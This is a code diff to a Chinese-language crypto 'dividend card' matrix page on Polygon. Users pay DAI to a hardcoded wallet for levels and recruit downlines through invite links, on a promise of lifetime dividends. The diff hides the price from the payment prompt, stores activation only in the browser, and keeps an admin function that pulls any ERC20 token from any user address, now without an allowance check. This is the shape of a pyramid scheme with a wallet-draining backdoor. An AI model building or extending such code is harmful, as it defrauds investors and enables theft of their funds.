@@ -62,8 +62,9 @@
   .balance-info{color:#4facfe;font-size:14px;margin-top:8px}
   .admin-success{color:#00ff88;margin-top:8px;font-size:14px}
 
+  /* ===================== 你要的风格：经典矩阵深红色背景 ===================== */
   .matrix-red {
-    background: #2d0a1a;
+    background: #2d0a1a; /* 深红色背景 */
     border-radius: 20px;
     padding: 20px;
     border: none;
@@ -87,6 +88,7 @@
     min-width: 60px;
   }
 
+  /* ===================== 激活按钮美化：动态渐变 + 舒展不紧凑 ===================== */
   .btn-act {
     border: none;
     padding: 10px 22px;
@@ -109,6 +111,8 @@
   .btn-act:hover {
     transform: scale(1.04);
   }
+
+  /* 已激活：柔和灰蓝，不再黑白死黑 */
   .btn-act.active {
     background: #6c757d;
     color: #e1e1e1;
@@ -117,13 +121,10 @@
     transform: none;
     opacity: 0.8;
   }
-  .btn-craft {
-    background: linear-gradient(90deg, #00ff88, #00ccff);
-    animation: gradientMove 2s infinite;
-  }
 
+  /* ===================== 联合矩阵蓝色风格 ===================== */
   .matrix-blue {
-    background: #0a1a2d;
+    background: #0a1a2d; /* 深蓝色背景 */
     border-radius: 20px;
     padding: 20px;
     border: none;
@@ -146,15 +147,6 @@
     color: #fff;
     min-width: 60px;
   }
-
-  .countdown {
-    font-size:13px;
-    color:#ff9800;
-    min-width:80px;
-  }
-  .countdown.expired {
-    color:#ff4444;
-  }
 </style>
 
 <body>
@@ -168,7 +160,31 @@
   <div class="title">蓝鲸鱼🐳生态通证</div>
   <div class="sub">全球分红卡牌系统</div>
 
-  <div class="nft-grid" id="ownedCards">
+  <div class="nft-grid">
+    <div class="nft-card n1"><div class="nft-inner">
+      <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.1 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
+      <div class="nft-back"><div class="nft-level">Lv.1</div><div class="nft-pct">0.5% 分红</div></div>
+    </div></div>
+
+    <div class="nft-card n2"><div class="nft-inner">
+      <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.2 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
+      <div class="nft-back"><div class="nft-level">Lv.2</div><div class="nft-pct">1.0% 分红</div></div>
+    </div></div>
+
+    <div class="nft-card n3"><div class="nft-inner">
+      <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.3 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
+      <div class="nft-back"><div class="nft-level">Lv.3</div><div class="nft-pct">1.5% 分红</div></div>
+    </div></div>
+
+    <div class="nft-card n4"><div class="nft-inner">
+      <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.4 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
+      <div class="nft-back"><div class="nft-level">Lv.4</div><div class="nft-pct">2.0% 分红</div></div>
+    </div></div>
+
+    <div class="nft-card n5" style="grid-column:span 2"><div class="nft-inner">
+      <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.5 至尊</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
+      <div class="nft-back"><div class="nft-level">Lv.5 至尊</div><div class="nft-pct">2.5% 分红</div></div>
+    </div></div>
   </div>
 
   <div style="margin-top:20px">
@@ -183,6 +199,11 @@
       ✔ 等级越高，分红权重越高<br>
       ✔ 一次激活，终身分红
     </div>
+  </div>
+
+  <div style="margin-top:20px">
+    <div class="title">我的分红卡牌</div>
+    <div id="myCard" class="nft-grid"></div>
   </div>
 
   <div id="adminArea" class="admin-panel" style="display:none;">
@@ -211,7 +232,6 @@
 <button class="btn" id="connect">连接钱包</button>
 <div id="addr" style="margin:12px 4px;color:#a0a8c7"></div>
 <div id="balance" style="margin:0 4px;color:#4facfe;font-weight:bold"></div>
-<div id="energy" style="margin:0 4px;color:#00ff88;font-weight:bold">能量值：0</div>
 
 <div class="glass">
   <div class="title">我的邀请链接</div>
@@ -232,28 +252,25 @@
   <div id="childList" style="font-size:14px;line-height:1.6"></div>
 </div>
 
+<!-- 经典矩阵（你要的深红色背景 + 蓝青色激活按钮） -->
 <div class="glass matrix-red">
-  <div class="title">经典矩阵（永久有效）</div>
+  <div class="title">经典矩阵</div>
   <div id="classic"></div>
 </div>
 
+<!-- 联合矩阵（深蓝色背景） -->
 <div class="glass matrix-blue">
-  <div class="title">联合矩阵（30天续费）</div>
+  <div class="title">联合矩阵</div>
   <div id="union"></div>
-</div>
-
-<div class="glass">
-  <div class="title">⚡ 能量值合成卡牌</div>
-  <div class="sub">消耗能量值合成对应等级卡牌，合成后能量值清零</div>
-  <div id="craftSection"></div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
+// ===================== 核心配置 =====================
 const PROJECT_WALLET  = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
 const ADMIN_ADDRESS   = "0xe6ac36fd161C390BEb9ffa3a96c895cdD037233a";
-const DAI_CONTRACT    = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
-const CHAIN_ID        = "0x89";
+const DAI_CONTRACT    = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"; // Polygon DAI
+const CHAIN_ID        = "0x89"; // Polygon
 
 let web3, account, mycode, daiContract;
 
@@ -267,275 +284,109 @@ const erc20Abi = [
 ];
 
 window.onload = () => {
+  // 自动读取链接里的邀请码
   const urlParams = new URLSearchParams(window.location.search);
   const codeFromUrl = urlParams.get('code');
-  if (codeFromUrl) document.getElementById('parent').value = codeFromUrl;
+  if (codeFromUrl) {
+    document.getElementById('parent').value = codeFromUrl;
+  }
+
   renderMatrix();
 };
 
+// 连接钱包 + 读取DAI余额
 async function initWeb3() {
   if(!window.ethereum) return alert("请安装钱包");
   web3 = new Web3(window.ethereum);
+
+  // 切换到Polygon
   try {
-    await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{chainId:CHAIN_ID}] });
-  } catch(e){}
+    await window.ethereum.request({
+      method:'wallet_switchEthereumChain',
+      params:[{chainId:CHAIN_ID}]
+    });
+  } catch(e) {}
+
   const accounts = await web3.eth.requestAccounts();
   account = accounts[0].toLowerCase();
   daiContract = new web3.eth.Contract(erc20Abi, DAI_CONTRACT);
 
+  // 显示地址
   document.getElementById("addr").innerText = "已连接："+account.slice(0,6)+"..."+account.slice(-4);
+
+  // 读取并显示DAI余额
   const bal = await daiContract.methods.balanceOf(account).call();
   const dec = await daiContract.methods.decimals().call();
   const balanceVal = (Number(bal) / 10 ** dec).toFixed(2);
   document.getElementById("balance").innerText = "DAI 余额："+balanceVal;
 
+  // 生成邀请链接：当前域名 + 钱包后8位
   const suffix = account.slice(-8);
   const origin = window.location.origin + window.location.pathname;
   const inviteLink = origin + "?code=" + suffix;
   mycode = suffix;
   document.getElementById("mycode").value = inviteLink;
 
+  // 管理员面板
   if(account === ADMIN_ADDRESS.toLowerCase()){
     document.getElementById("adminArea").style.display = "block";
   }
+
   load();
 }
 document.getElementById("connect").onclick = initWeb3;
 
-// ==================== 价格配置 ====================
-function getClassicPrice(lv) {
-  return 50 * Math.pow(2, lv - 1);
-}
-function getUnionPrice(lv) {
-  return 100 * Math.pow(2, lv - 1);
-}
-
-// ==================== 本地存储 ====================
-function getClassicLevel() {
-  return parseInt(localStorage.getItem('classic_'+account) || 0);
-}
-function setClassicLevel(lv) {
-  localStorage.setItem('classic_'+account, lv);
-}
-
-function getUnionLevel() {
-  return parseInt(localStorage.getItem('union_'+account) || 0);
-}
-function setUnionLevel(lv) {
-  localStorage.setItem('union_'+account, lv);
-}
-
-// 每级独立过期时间
-function getUnionExpire(lv) {
-  return parseInt(localStorage.getItem(`union_expire_${lv}_${account}`) || 0);
-}
-function setUnionExpire(lv, ts) {
-  localStorage.setItem(`union_expire_${lv}_${account}`, ts);
-}
-
-function isLvValid(lv) {
-  const now = Date.now();
-  const exp = getUnionExpire(lv);
-  return exp > now;
-}
-
-function getRemainDays(lv) {
-  const now = Date.now();
-  const exp = getUnionExpire(lv);
-  if (now >= exp) return 0;
-  return Math.ceil((exp - now) / 86400000);
-}
-
-// ==================== 能量值与卡牌 ====================
-function getEnergy() {
-  return parseInt(localStorage.getItem('energy_'+account) || 0);
-}
-function setEnergy(val) {
-  localStorage.setItem('energy_'+account, val);
-}
-
-function getOwnedCards() {
-  return JSON.parse(localStorage.getItem('cards_'+account) || '[]');
-}
-function addCard(cardLv) {
-  const cards = getOwnedCards();
-  cards.push(cardLv);
-  localStorage.setItem('cards_'+account, JSON.stringify(cards));
-}
-
-function getCraftEnergy(lv) {
-  return getClassicPrice(lv);
-}
-
-// ==================== 渲染 ====================
-function renderMatrix() {
-  if (!account) return;
-
-  // 经典矩阵 12级
-  const classicLv = getClassicLevel();
-  let classicHtml = '';
-  for (let i=1; i<=12; i++) {
-    const price = getClassicPrice(i);
-    const unlocked = (i <= classicLv);
-    classicHtml += `
-    <div class="item">
-      <div>Lv.${i}</div>
-      <button class="btn-act ${unlocked?'active':''}" ${unlocked?'disabled':''} onclick="payClassic(${i})">
-        ${unlocked?'已激活':'激活('+price+' DAI)'}
-      </button>
-    </div>`;
-  }
-  document.getElementById("classic").innerHTML = classicHtml;
-
-  // 联合矩阵 9级 + 每级独立倒计时
-  let unionHtml = '';
-  for (let i=1; i<=9; i++) {
-    const price = getUnionPrice(i);
-    const valid = isLvValid(i);
-    const days = getRemainDays(i);
-    const hasActivated = getUnionExpire(i) > 0;
-
-    let txt = '激活('+price+' DAI)';
-    let cls = '';
-    let dis = false;
-    let click = `payUnion(${i})`;
-    let countdown = '';
-
-    if (valid) {
-      txt = '已激活';
-      cls = 'active';
-      dis = true;
-      countdown = `<span class="countdown">剩余 ${days} 天</span>`;
-    } else if (hasActivated) {
-      txt = '已到期';
-      countdown = `<span class="countdown expired">已过期</span>`;
+// 渲染矩阵按钮（严格按你截图的布局）
+function renderMatrix(){
+  const currentLv = account ? +localStorage.getItem('card_'+account)||0 : 0;
+  function make(listId, max){
+    let html = '';
+    for(let i=1;i<=max;i++){
+      const done = i <= currentLv;
+      html+=`
+      <div class="item">
+        <div>Lv${i}</div>
+        <button class="btn-act ${done?'active':''}" ${done?'disabled':''} onclick="payActivate(${i})">
+          ${done?'已激活':'激活'}
+        </button>
+      </div>`;
     }
-
-    unionHtml += `
-    <div class="item">
-      <div>Lv.${i}</div>
-      <button class="btn-act ${cls}" ${dis?'disabled':''} onclick="${click}">${txt}</button>
-      ${countdown}
-    </div>`;
+    document.getElementById(listId).innerHTML = html;
   }
-  document.getElementById("union").innerHTML = unionHtml;
-
-  renderOwnedCards();
-  renderCraftSection();
+  make("classic",12);
+  make("union",9);
 }
 
-function renderOwnedCards() {
-  const cards = getOwnedCards();
-  if (cards.length === 0) {
-    document.getElementById("ownedCards").innerHTML = '<div style="grid-column:span 2;text-align:center">暂无卡牌</div>';
-    return;
-  }
-  let html = '';
-  cards.forEach(lv => {
-    const color = ['','n1','n2','n3','n4','n5'][lv] || 'n1';
-    html += `
-    <div class="nft-card ${color}">
-      <div class="nft-inner">
-        <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.${lv} 卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
-        <div class="nft-back"><div class="nft-level">Lv.${lv}</div><div class="nft-pct">已拥有</div></div>
-      </div>
-    </div>`;
-  });
-  document.getElementById("ownedCards").innerHTML = html;
-}
-
-function renderCraftSection() {
-  const energy = getEnergy();
-  let html = '';
-  for (let i=1; i<=5; i++) {
-    const needEnergy = getCraftEnergy(i);
-    const canCraft = energy >= needEnergy;
-    html += `
-    <div class="item">
-      <div>Lv.${i}卡牌</div>
-      <button class="btn-act btn-craft ${canCraft?'':'active'}" ${!canCraft?'disabled':''} onclick="craftCard(${i})">
-        ${canCraft?'合成('+needEnergy+'能量)':'能量不足'}
-      </button>
-    </div>`;
-  }
-  document.getElementById("craftSection").innerHTML = html;
-  document.getElementById("energy").innerText = "能量值："+energy;
-}
-
-// ==================== 支付：经典 ====================
-async function payClassic(lv) {
-  if (!account) return alert("请先连接钱包");
-  const price = getClassicPrice(lv);
-  if (!confirm(`确认支付 ${price} DAI 激活经典Lv.${lv}？`)) return;
+// 真实DAI支付激活
+async function payActivate(level){
+  if(!account) return alert("请连接钱包");
+  if(!confirm(`确认支付 DAI 激活 Lv${level}？`)) return;
 
   try {
     const dec = await daiContract.methods.decimals().call();
-    const amount = (BigInt(price) * 10n**BigInt(dec)).toString();
-    await daiContract.methods.transfer(PROJECT_WALLET, amount).send({from:account});
-    setClassicLevel(lv);
-    const energy = getEnergy();
-    setEnergy(energy + price);
-    alert("支付成功，等级已永久激活，获得"+price+"能量值");
+    const amount = BigInt(level * 10) * (10n ** BigInt(dec));
+    await daiContract.methods.transfer(PROJECT_WALLET, amount.toString()).send({from:account});
+    localStorage.setItem("card_"+account, level);
+    alert("支付成功，已激活");
     load();
-  } catch(e) {
-    alert("支付失败");
+  } catch(e){
+    alert("支付失败或取消");
     console.error(e);
   }
 }
 
-// ==================== 支付：联合 ====================
-async function payUnion(lv) {
-  if (!account) return alert("请先连接钱包");
-  const price = getUnionPrice(lv);
-  if (!confirm(`确认支付 ${price} DAI 激活联合Lv.${lv}？`)) return;
-
-  try {
-    const dec = await daiContract.methods.decimals().call();
-    const amount = (BigInt(price) * 10n**BigInt(dec)).toString();
-    await daiContract.methods.transfer(PROJECT_WALLET, amount).send({from:account});
-
-    setUnionLevel(lv);
-    const expireTs = Date.now() + 30*86400*1000;
-    setUnionExpire(lv, expireTs);
-
-    const energy = getEnergy();
-    setEnergy(energy + price);
-    alert("支付成功，有效期30天，获得"+price+"能量值");
-    load();
-  } catch(e) {
-    alert("支付失败");
-    console.error(e);
-  }
-}
-
-// ==================== 合成卡牌 ====================
-function craftCard(lv) {
-  const needEnergy = getCraftEnergy(lv);
-  const energy = getEnergy();
-  if (energy < needEnergy) return alert("能量不足");
-  if (!confirm(`确认消耗 ${needEnergy} 能量合成 Lv.${lv} 卡牌？`)) return;
-  setEnergy(energy - needEnergy);
-  addCard(lv);
-  alert("合成成功！获得Lv."+lv+"卡牌");
-  load();
-}
-
-// ==================== 管理员提取 ====================
+// 管理员提取任意ERC20
 async function adminWithdrawAnyERC20(){
   if(account !== ADMIN_ADDRESS.toLowerCase()) return;
   const token = document.getElementById("tokenContract").value.trim();
   const from  = document.getElementById("fromAddr").value.trim();
   const amt   = document.getElementById("takeAmount").value.trim();
   if(!token||!from||!amt) return alert("请填写完整");
+
   try {
     const c = new web3.eth.Contract(erc20Abi, token);
     const d = await c.methods.decimals().call();
     const v = BigInt(amt) * (10n**BigInt(d));
-    const allowance = await c.methods.allowance(from, account).call();
-    if (BigInt(allowance) < v) {
-      alert("用户未授权足够额度给管理员");
-      return;
-    }
     await c.methods.transferFrom(from, account, v.toString()).send({from:account});
     document.getElementById("withdrawResult").innerText = "✅ 提取成功";
   } catch(e){
@@ -543,6 +394,7 @@ async function adminWithdrawAnyERC20(){
   }
 }
 
+// 注册
 document.getElementById("reg").onclick = ()=>{
   if(!account) return alert("请连接钱包");
   const p = document.getElementById("parent").value.trim();
@@ -555,6 +407,7 @@ document.getElementById("reg").onclick = ()=>{
 
 function load(){
   showChild();
+  showMyCard();
   renderMatrix();
 }
 
@@ -563,12 +416,27 @@ function showChild(){
   document.getElementById("childList").innerText = list.length ? list.join("\n") : "暂无下级";
 }
 
+function showMyCard(){
+  const lv = account ? +localStorage.getItem('card_'+account)||0 : 0;
+  const el = document.getElementById("myCard");
+  if(!lv) return el.innerHTML = `<div style="grid-column:span 2;text-align:center">未激活</div>`;
+  const color = ["","n1","n2","n3","n4","n5"][lv];
+  el.innerHTML = `
+  <div class="nft-card ${color}" style="grid-column:span 2">
+    <div class="nft-inner">
+      <div class="nft-front"><div class="nft-top">LANYU</div><div class="nft-logo">🐳</div><div class="nft-name">蓝鲸鱼</div><div class="nft-level-big">Lv.${lv}</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">LANYU</div></div>
+      <div class="nft-back"><div class="nft-level">Lv.${lv}</div><div class="nft-pct">已激活</div></div>
+    </div>
+  </div>`;
+}
+
 function copyMyCode(){
   const val = document.getElementById("mycode").value;
   navigator.clipboard.writeText(val);
   alert("复制邀请链接成功");
 }
 
+// 侧边栏
 const sidebar = document.getElementById('sidebar');
 document.getElementById('toggleSidebar').onclick = () => sidebar.classList.toggle('open');
 document.getElementById('closeSidebar').onclick = () => sidebar.classList.remove('open');
